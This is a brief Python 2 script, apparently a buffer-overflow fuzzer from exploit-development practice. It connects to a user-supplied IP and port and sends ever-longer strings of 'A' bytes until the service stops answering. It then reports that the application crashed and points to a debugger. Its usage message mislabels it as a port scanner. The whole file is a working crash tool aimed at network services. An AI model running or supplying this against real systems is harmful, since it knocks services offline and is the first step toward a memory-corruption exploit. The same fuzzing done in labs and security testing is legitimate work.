import sys,socket
def crash():
	address = str(sys.argv[1])
	port = int(sys.argv[2])
	buffer = ['\x41']
	counter = 100
	while len(buffer)<= 10:
		buffer.append('\x41'*counter)
		counter=counter+100
	try:
		for string in buffer:
			print '[+] Sending payload of %s bytes of letter A(\\x41)...' % len(string)
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			connect=s.connect((address,port))
			s.recv(1024)
			s.send(string + '\r\n')
	except:
 		print '[!] Application is crashed Successfully Or Connection may be failed.\n [!] Make sure you enter the correct IP & Port number Or Check the debugger for the Successful crash'
 		sys.exit(0)
	finally:
		s.close()

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage: ./portscanner.py <IP address> <port>')
        print('Example: ./portscanner.py 192.168.1.12 9999')
    else:
    	crash()
